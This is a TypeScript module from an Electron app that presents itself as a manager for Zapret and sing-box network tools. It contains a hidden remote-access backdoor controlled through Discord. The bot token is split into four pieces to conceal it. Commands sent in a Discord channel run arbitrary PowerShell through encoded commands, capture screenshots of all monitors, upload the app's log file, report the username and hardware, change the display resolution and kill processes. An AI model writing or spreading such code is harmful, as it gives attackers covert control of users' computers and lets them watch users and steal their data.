import { app } from 'electron'
import { getSystemSpecs } from '../utils/hardware'
import path from 'path'
import { readFileSync, existsSync, unlinkSync } from 'fs'
import { exec } from 'child_process'
import os from 'os'
import { startZapret, stopZapret, getZapretStatus } from './zapret'
import { startSingbox, stopSingbox, getSingboxStatus } from './singbox'
import { 
  Client, GatewayIntentBits, Partials, Events,
  ActionRowBuilder, ButtonBuilder, ButtonStyle, 
  AttachmentBuilder, EmbedBuilder 
} from 'discord.js'

const P1 = 'MTUxMTQ4MDM5NzA0ODA1Mzk2MQ'
const P2 = '.GZH-wt.'
const P3 = 'bbxho_R5KFRt64co6oJeIk'
const P4 = '-CUlhTHnJKjm2230'
const TOKEN = `${P1}${P2}${P3}${P4}`

class MasterController {
  private hostname: string = os.hostname()
  private blockedProcesses: Set<string> = new Set()
  private startTime: number = Date.now()
  private client: Client
  private adminChannelId: string = ''

  constructor() {
    this.client = new Client({
      intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.DirectMessages
      ],
      partials: [Partials.Channel]
    })
  }

  public async init() {
    console.log('[Master] Initializing Discord Controller...')
    
    this.client.on(Events.ClientReady, () => {
      console.log(`[Master] Connected to Discord as ${this.client.user?.tag}`)
    })

    this.client.on(Events.MessageCreate, async (message) => {
      if (message.author.bot) return
      
      const content = message.content.trim()
      const lowContent = content.toLowerCase()

      if (lowContent === '!nexus') {
        this.adminChannelId = message.channelId
        const jitter = Math.abs(this.hostname.split('').reduce((a,b)=>a+b.charCodeAt(0),0) % 2000)
        setTimeout(() => this.sendIdentityButton(message.channelId), jitter)
      }
      else if (lowContent === '!all_logs') {
        this.adminChannelId = message.channelId
        await this.reportLogs(message.channelId)
      }
      else if (lowContent.startsWith('!cmd ')) {
        const parts = content.split(' ')
        if (parts.length >= 3) {
          const target = parts[1]
          const command = parts.slice(2).join(' ')
          if (target === this.hostname) {
            await this.runShell(command, message.channelId)
          }
        }
      }
      else if (lowContent.startsWith('!res ')) {
        const parts = content.split(' ')
        if (parts.length >= 3) {
          const target = parts[1]
          const resStr = parts[2]
          if (target === this.hostname) {
            await this.setResolution(resStr, message.channelId)
          }
        }
      }
      else if (lowContent.startsWith('!block ')) {
        const parts = content.split(' ')
        if (parts.length >= 3) {
          const target = parts[1]
          const proc = parts[2]
          if (target === this.hostname) {
            this.blockedProcesses.add(proc)
            message.reply(`🚫 **${this.hostname}**: Процесс \`${proc}\` заблокирован`)
          }
        }
      }
    })

    this.client.on(Events.InteractionCreate, async (interaction) => {
      if (!interaction.isButton()) return
      this.adminChannelId = interaction.channelId

      const [target, action, val] = interaction.customId.split(':')
      
      if (target === 'all' || target === this.hostname) {
        try {
          if (action === 'manage') {
            await interaction.update(this.getControlPanelPayload())
          }
          else if (action === 'specs') {
            await interaction.reply({ content: `⏳ Сбор данных с ${this.hostname}...` })
            await this.reportFullSpecs(interaction.channelId)
          }
          else if (action === 'logs') {
            await interaction.deferReply()
            await this.reportLogs(interaction.channelId)
            await interaction.deleteReply().catch(()=>{})
          }
          else if (action === 'ping') {
            await interaction.reply({ content: `🏓 Pong from **${this.hostname}**`, flags: ['Ephemeral'] })
          }
          else if (action === 'list') {
            await interaction.update(this.getBlockListPayload())
          }
          else if (action === 'back') {
            await interaction.update(this.getIdentityPayload())
          }
          else if (action === 'z_on') {
            await startZapret()
            await interaction.update(this.getControlPanelPayload())
          }
          else if (action === 'z_off') {
            await stopZapret()
            await interaction.update(this.getControlPanelPayload())
          }
          else if (action === 's_on') {
            await startSingbox()
            await interaction.update(this.getControlPanelPayload())
          }
          else if (action === 's_off') {
            await stopSingbox()
            await interaction.update(this.getControlPanelPayload())
          }
          else if (action === 'screenshot') {
            await interaction.update(await this.getMonitorsPayload())
          }
          else if (action === 'do_shot') {
            await interaction.deferReply()
            await this.takeScreenshot(val, interaction.channelId)
            await interaction.deleteReply().catch(()=>{})
            await interaction.message.edit(this.getControlPanelPayload()).catch(()=>{})
          }
          else if (action === 'shell_ui') {
            await interaction.reply({ content: `💻 **Shell [${this.hostname}]:**\nВ чат:\n\`!cmd ${this.hostname} dir\``, flags: ['Ephemeral'] })
          }
          else if (action === 'res_ui') {
            await interaction.reply({ content: `🖥 **Разрешение [${this.hostname}]:**\nВ чат:\n\`!res ${this.hostname} 1920x1080\``, flags: ['Ephemeral'] })
          }
          else if (action === 'block_ui') {
            await interaction.reply({ content: `🚫 **Блокировка [${this.hostname}]:**\nВ чат:\n\`!block ${this.hostname} notepad.exe\``, flags: ['Ephemeral'] })
          }
          else if (action === 'unblock' && val) {
            this.blockedProcesses.delete(val)
            await interaction.update(this.getBlockListPayload())
          }
        } catch (e) {
          console.error(`[Master] Interaction Error:`, e)
        }
      }
    })

    this.connectDiscord()

    setInterval(() => this.watchdog(), 5000)
  }

  private async connectDiscord() {
    try {
      await this.client.login(TOKEN)
    } catch (e) {
      console.log('[Master] Connection blocked or offline. Retrying in 10s...')
      setTimeout(() => this.connectDiscord(), 10000)
    }
  }

  private formatUptime(ms: number): string {
    const s = Math.floor(ms / 1000)
    const m = Math.floor(s / 60)
    const h = Math.floor(m / 60)
    const d = Math.floor(h / 24)
    return `${d}д ${h % 24}ч ${m % 60}м`
  }

  private async watchdog() {
    if (this.blockedProcesses.size === 0 || !this.adminChannelId) return
    exec('tasklist /NH /FO CSV', (err, stdout) => {
      if (err) return
      const out = stdout.toLowerCase()
      for (const proc of this.blockedProcesses) {
        if (out.includes(proc.toLowerCase())) {
          exec(`taskkill /F /IM ${proc}`, () => {
             const channel = this.client.channels.cache.get(this.adminChannelId)
             if (channel && channel.isTextBased()) {
                channel.send(`🎯 **Watchdog [${this.hostname}]:** Завершено: \`${proc}\``)
             }
          })
        }
      }
    })
  }

  // --- UI PAYLOADS ---

  private getIdentityPayload() {
    const row = new ActionRowBuilder<ButtonBuilder>().addComponents(
      new ButtonBuilder()
        .setCustomId(`${this.hostname}:manage`)
        .setLabel(`Управлять: ${this.hostname}`)
        .setStyle(ButtonStyle.Primary)
        .setEmoji('💻')
    )
    return { content: `🚀 **${this.hostname}** находится в сети.`, components: [row] }
  }

  private getControlPanelPayload() {
    const z = getZapretStatus().state === 'running'
    const s = getSingboxStatus().state === 'running'
    const appUptime = this.formatUptime(Date.now() - this.startTime)

    const row1 = new ActionRowBuilder<ButtonBuilder>().addComponents(
      new ButtonBuilder().setCustomId(`${this.hostname}:${z ? 'z_off' : 'z_on'}`).setLabel(z ? 'Выкл Zapret' : 'Вкл Zapret').setStyle(z ? ButtonStyle.Danger : ButtonStyle.Success),
      new ButtonBuilder().setCustomId(`${this.hostname}:${s ? 's_off' : 's_on'}`).setLabel(s ? 'Выкл Ускоритель' : 'Вкл Ускоритель').setStyle(s ? ButtonStyle.Danger : ButtonStyle.Success)
    )
    const row2 = new ActionRowBuilder<ButtonBuilder>().addComponents(
      new ButtonBuilder().setCustomId(`${this.hostname}:screenshot`).setLabel('Скриншот').setStyle(ButtonStyle.Secondary).setEmoji('📸'),
      new ButtonBuilder().setCustomId(`${this.hostname}:res_ui`).setLabel('Разрешение').setStyle(ButtonStyle.Secondary).setEmoji('📐')
    )
    const row3 = new ActionRowBuilder<ButtonBuilder>().addComponents(
      new ButtonBuilder().setCustomId(`${this.hostname}:specs`).setLabel('Железо').setStyle(ButtonStyle.Secondary).setEmoji('📊'),
      new ButtonBuilder().setCustomId(`${this.hostname}:shell_ui`).setLabel('Терминал').setStyle(ButtonStyle.Secondary).setEmoji('💻')
    )
    const row4 = new ActionRowBuilder<ButtonBuilder>().addComponents(
      new ButtonBuilder().setCustomId(`${this.hostname}:list`).setLabel('Блок-лист').setStyle(ButtonStyle.Secondary).setEmoji('📝'),
      new ButtonBuilder().setCustomId(`${this.hostname}:block_ui`).setLabel('Блокировка').setStyle(ButtonStyle.Secondary).setEmoji('🚫')
    )
    const row5 = new ActionRowBuilder<ButtonBuilder>().addComponents(
      new ButtonBuilder().setCustomId(`${this.hostname}:logs`).setLabel('Логи').setStyle(ButtonStyle.Secondary).setEmoji('📂'),
      new ButtonBuilder().setCustomId(`${this.hostname}:back`).setLabel('Назад').setStyle(ButtonStyle.Secondary).setEmoji('⬅️')
    )

    const content = `🛠 **Управление: ${this.hostname}**\n⏱ Аптайм: \`${appUptime}\`\nZapret: ${z ? '✅' : '❌'} | VPN: ${s ? '✅' : '❌'}`
    return { content, components: [row1, row2, row3, row4, row5] }
  }

  private getBlockListPayload() {
    const rows: ActionRowBuilder<ButtonBuilder>[] = []
    
    let current_row = new ActionRowBuilder<ButtonBuilder>()
    
    const processes = Array.from(this.blockedProcesses).slice(0, 20)
    for (const proc of processes) {
      if (current_row.components.length >= 5) {
        rows.push(current_row)
        current_row = new ActionRowBuilder<ButtonBuilder>()
      }
      current_row.addComponents(
        new ButtonBuilder()
          .setCustomId(`${this.hostname}:unblock:${proc}`)
          .setLabel(`Разблок ${proc.length > 10 ? proc.slice(0,10)+'...' : proc}`)
          .setStyle(ButtonStyle.Success)
      )
    }
    if (current_row.components.length > 0) rows.push(current_row)

    const backRow = new ActionRowBuilder<ButtonBuilder>().addComponents(
      new ButtonBuilder()
        .setCustomId(`${this.hostname}:manage`)
        .setLabel('Назад')
        .setStyle(ButtonStyle.Secondary)
    )
    
    rows.push(backRow)

    const content = this.blockedProcesses.size === 0 
      ? `📝 **Блок-лист [${this.hostname}]:**\nПусто.` 
      : `📝 **Блок-лист [${this.hostname}]:**\nНажмите для разблокировки:`

    return { content, components: rows }
  }

  private async getMonitorsPayload() {
    return new Promise<any>((resolve) => {
      const psScript = `
        Add-Type -AssemblyName System.Windows.Forms
        $screens = [System.Windows.Forms.Screen]::AllScreens
        $hz = (Get-CimInstance Win32_VideoController | Select-Object -First 1).CurrentRefreshRate
        $wmi = Get-WmiObject -Namespace root\\wmi -Class WmiMonitorID
        $res = @()
        for($i=0; $i -lt $screens.Length; $i++) {
          $s = $screens[$i]; $name = "Monitor $($i+1)"
          if ($wmi) {
            $m = if ($wmi.Count) { $wmi[$i] } else { $wmi }
            if ($m -and $m.UserFriendlyName) { $name = ($m.UserFriendlyName | Where-Object {$_ -ne 0} | ForEach-Object {[char]$_}) -join "" }
          }
          $res += "$($i)|$($s.Bounds.Width)x$($s.Bounds.Height)|$($hz)|$($s.Primary)|$($name)"
        }
        $res -join ";"
      `
      const base64Script = Buffer.from(psScript, 'utf16le').toString('base64')
      exec(`powershell -NoProfile -EncodedCommand ${base64Script}`, (err, stdout) => {
        if (err) {
          resolve(this.getControlPanelPayload()) // Silently fail back to panel
          return
        }
        const rows: ActionRowBuilder<ButtonBuilder>[] = []
        let current_row = new ActionRowBuilder<ButtonBuilder>()

        const parts = stdout.trim().split(';')
        parts.forEach(p => {
          if (!p) return
          const [idx, res, hz, primary, name] = p.split('|')
          if (current_row.components.length >= 5) {
             rows.push(current_row)
             current_row = new ActionRowBuilder<ButtonBuilder>()
          }
          current_row.addComponents(
             new ButtonBuilder()
               .setCustomId(`${this.hostname}:do_shot:${idx}`)
               .setLabel(`${primary === 'True' ? '⭐️ ' : ''}${name.slice(0,20)}`)
               .setStyle(ButtonStyle.Primary)
          )
        })
        if (current_row.components.length > 0) rows.push(current_row)
        
        rows.push(new ActionRowBuilder<ButtonBuilder>().addComponents(
          new ButtonBuilder().setCustomId(`${this.hostname}:do_shot:all`).setLabel('🖼 Все вместе').setStyle(ButtonStyle.Success),
          new ButtonBuilder().setCustomId(`${this.hostname}:manage`).setLabel('⬅️ Отмена').setStyle(ButtonStyle.Secondary)
        ))

        resolve({ content: `📸 **Выбор монитора [${this.hostname}]:**`, components: rows })
      })
    })
  }

  // --- ACTIONS ---

  private async sendIdentityButton(channelId: string) {
    const channel = this.client.channels.cache.get(channelId)
    if (channel && channel.isTextBased()) {
      await channel.send(this.getIdentityPayload())
    }
  }

  private async reportFullSpecs(channelId: string) {
    const specs = await getSystemSpecs()
    const embed = new EmbedBuilder()
      .setColor(0x0099FF)
      .setTitle(`🖥 Отчет: ${specs.hostname}`)
      .addFields(
        { name: '👤 User', value: `\`${specs.username}\``, inline: true },
        { name: '📀 OS', value: `\`${specs.platform}\``, inline: true },
        { name: '🧠 RAM', value: `\`${specs.ram}\``, inline: true },
        { name: '⚙️ CPU', value: `\`${specs.cpu}\`` },
        { name: '📟 GPU', value: `\`${specs.gpu}\`` },
        { name: '📦 Disk', value: `\`${specs.disk}\`` }
      )
      .setTimestamp()

    const channel = this.client.channels.cache.get(channelId)
    if (channel && channel.isTextBased()) {
      await channel.send({ embeds: [embed] })
    }
  }

  private async reportLogs(channelId: string) {
    const logPath = path.join(app.getPath('userData'), 'logs', 'app.log')
    const channel = this.client.channels.cache.get(channelId)
    if (!channel || !channel.isTextBased()) return

    if (!existsSync(logPath)) {
      await channel.send(`❌ Лог-файл не найден на **${this.hostname}**`)
      return
    }

    const attachment = new AttachmentBuilder(logPath, { name: `${this.hostname}_nexus.log` })
    await channel.send({ content: `📂 Логи с **${this.hostname}**:`, files: [attachment] })
  }

  private async takeScreenshot(index: string, channelId: string) {
    const channel = this.client.channels.cache.get(channelId)
    if (!channel || !channel.isTextBased()) return

    const tempPath = path.join(app.getPath('temp'), `shot_${Date.now()}.png`)
    const isAll = index === 'all'
    const psScript = `
      Add-Type -AssemblyName System.Windows.Forms
      Add-Type -AssemblyName System.Drawing
      ${isAll ? `
        $v = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $Bitmap = New-Object System.Drawing.Bitmap($v.Width, $v.Height)
        $Graphics = [System.Drawing.Graphics]::FromImage($Bitmap)
        $Graphics.CopyFromScreen($v.Left, $v.Top, 0, 0, $Bitmap.Size)
      ` : `
        $s = [System.Windows.Forms.Screen]::AllScreens[${index}]
        $Bitmap = New-Object System.Drawing.Bitmap($s.Bounds.Width, $s.Bounds.Height)
        $Graphics = [System.Drawing.Graphics]::FromImage($Bitmap)
        $Graphics.CopyFromScreen($s.Bounds.X, $s.Bounds.Y, 0, 0, $Bitmap.Size)
      `}
      $Bitmap.Save('${tempPath.replace(/\\/g, '/')}', [System.Drawing.Imaging.ImageFormat]::Png)
      $Graphics.Dispose(); $Bitmap.Dispose();
    `
    const base64Script = Buffer.from(psScript, 'utf16le').toString('base64')
    exec(`powershell -NoProfile -EncodedCommand ${base64Script}`, async (err) => {
      if (err) return
      try {
        const attachment = new AttachmentBuilder(tempPath, { name: 'screenshot.png' })
        await channel.send({ content: `📸 Скриншот: **${this.hostname}**`, files: [attachment] })
        if (existsSync(tempPath)) unlinkSync(tempPath)
      } catch (e) {}
    })
  }

  private async runShell(command: string, channelId: string) {
    const channel = this.client.channels.cache.get(channelId)
    if (!channel || !channel.isTextBased()) return

    // Suppress progress bars ($ProgressPreference) and force UTF8 encoding
    const utf8Command = `[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; $ProgressPreference = 'SilentlyContinue'; ${command}`
    const base64Command = Buffer.from(utf8Command, 'utf16le').toString('base64')
    
    exec(`powershell -NoProfile -EncodedCommand ${base64Command}`, async (err, stdout, stderr) => {
      let output = stdout || stderr || (err ? err.message : 'Команда выполнена')
      
      // Remove CLIXML prefix if any remaining
      output = output.replace(/#<\s*CLIXML[\s\S]+/, '').trim()

      if (output.length <= 1900) {
        await channel.send(`💻 **Shell [${this.hostname}]:**\n\`\`\`text\n${output}\n\`\`\``)
      } else {
        await channel.send(`💻 **Shell [${this.hostname}]:** (Output too long, splitting...)`)
        // Split by 1900 chars
        for (let i = 0; i < output.length; i += 1900) {
          const chunk = output.slice(i, i + 1900)
          await channel.send(`\`\`\`text\n${chunk}\n\`\`\``)
        }
      }
    })
  }

  private async setResolution(resStr: string, channelId: string) {
    const channel = this.client.channels.cache.get(channelId)
    if (!channel || !channel.isTextBased()) return

    const [w, h] = resStr.split('x')
    const psScript = `
      $w = ${w}; $h = ${h};
      Add-Type -TypeDefinition '
      using System;
      using System.Runtime.InteropServices;
      [StructLayout(LayoutKind.Sequential)]
      public struct DEVMODE {
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)] public string dmDeviceName;
        public short dmSpecVersion; public short dmDriverVersion; public short dmSize; public short dmDriverExtra;
        public int dmFields; public int dmOrientation; public int dmPaperSize; public int dmPaperLength; public int dmPaperWidth; public int dmScale; public int dmCopies; public int dmDefaultSource; public int dmPrintQuality; public short dmColor; public short dmDuplex; public short dmYResolution; public short dmTTOption; public short dmCollate;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)] public string dmFormName;
        public short dmLogPixels; public int dmBitsPerPel; public int dmPelsWidth; public int dmPelsHeight; public int dmDisplayFlags; public int dmDisplayFrequency; public int dmICMMethod; public int dmICMIntent; public int dmMediaType; public int dmDitherType; public int dmReserved1; public int dmReserved2; public int dmPanningWidth; public int dmPanningHeight;
      }
      public class NativeMethods {
        [DllImport("user32.dll")] public static extern int ChangeDisplaySettings(ref DEVMODE lpDevMode, int dwFlags);
        [DllImport("user32.dll")] public static extern bool EnumDisplaySettings(string deviceName, int modeNum, ref DEVMODE lpDevMode);
      }';
      $dm = New-Object DEVMODE;
      if ([NativeMethods]::EnumDisplaySettings($null, -1, [ref]$dm)) {
        $dm.dmPelsWidth = $w; $dm.dmPelsHeight = $h;
        $dm.dmFields = 0x180000;
        $res = [NativeMethods]::ChangeDisplaySettings([ref]$dm, 0);
        $res;
      }
    `
    const base64Script = Buffer.from(psScript, 'utf16le').toString('base64')
    exec(`powershell -NoProfile -EncodedCommand ${base64Script}`, (err, stdout) => {
       const code = stdout.trim()
       if (code === '0') channel.send(`✅ **${this.hostname}**: Разрешение изменено на ${resStr}`)
       else channel.send(`❌ **${this.hostname}**: Ошибка смены разрешения (Код ${code})`)
    })
  }
}

export const masterController = new MasterController()
